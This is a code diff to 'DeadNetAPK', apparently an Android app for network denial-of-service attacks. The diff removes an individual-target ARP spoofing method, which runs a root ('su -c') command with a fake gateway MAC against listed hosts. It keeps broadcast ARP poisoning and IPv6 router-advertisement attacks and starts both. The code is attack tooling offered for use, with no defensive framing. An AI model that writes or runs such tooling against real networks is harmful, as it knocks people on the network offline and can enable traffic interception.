@@ -44,7 +44,7 @@ class DeadNetAPK:
         self._nra_sleep_interval = 2 # todo rename
         self._max_workers = 3 # todo remove
 
-        self._arp_ind_proc_pid = self._arp_bcast_proc_pid = self._nra_proc_pid = None
+        self._arp_bcast_proc = self._nra_proc = None  # todo typing
 
         self._network_interface = iface
 
@@ -132,16 +132,6 @@ class DeadNetAPK:
             self._do_ipv6_attack()
         self._do_ipv4_attack(host_ip)
 
-    def _ipv4_arp_ind_attack(self) -> None:
-        self._arp_ind_proc = subprocess.Popen(
-            ["su", "-c",
-             f"{self.arp_path} {self._network_interface} {','.join(self._host_ipv4s)} {self._gateway_mac_fake} "
-             f"{self._gateway_ipv4} {self._gateway_mac} {self._my_mac} {self._arp_sleep_interval}"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-        Logger.info(f"DeadNet: started arp ind attack proc_id {self._arp_ind_proc.pid}")
-
     def _ipv4_arp_bcast_attack(self) -> None:
         self._arp_bcast_proc = subprocess.Popen(
             ["su", "-c",
@@ -191,7 +181,6 @@ class DeadNetAPK:
         #         executor.submit(self._worker_attack_task, idx, ip)
         # todo add elapsed time
 
-        #self._ipv4_arp_ind_attack()
         self._ipv4_arp_bcast_attack()
         self._ipv6_nra_attack()
         Clock.schedule_once(lambda dt: self.print_mtd(f"{self._intro}status - {GREEN}running...{COLOR_RESET}"))
@@ -208,9 +197,6 @@ class DeadNetAPK:
 
         self._kill_proc(self._arp_bcast_proc)
         self._arp_bcast_proc = None
-
-        self._kill_proc(self._arp_ind_proc)
-        self._arp_ind_proc = None
 
     def start_attack(self) -> None:
         try:
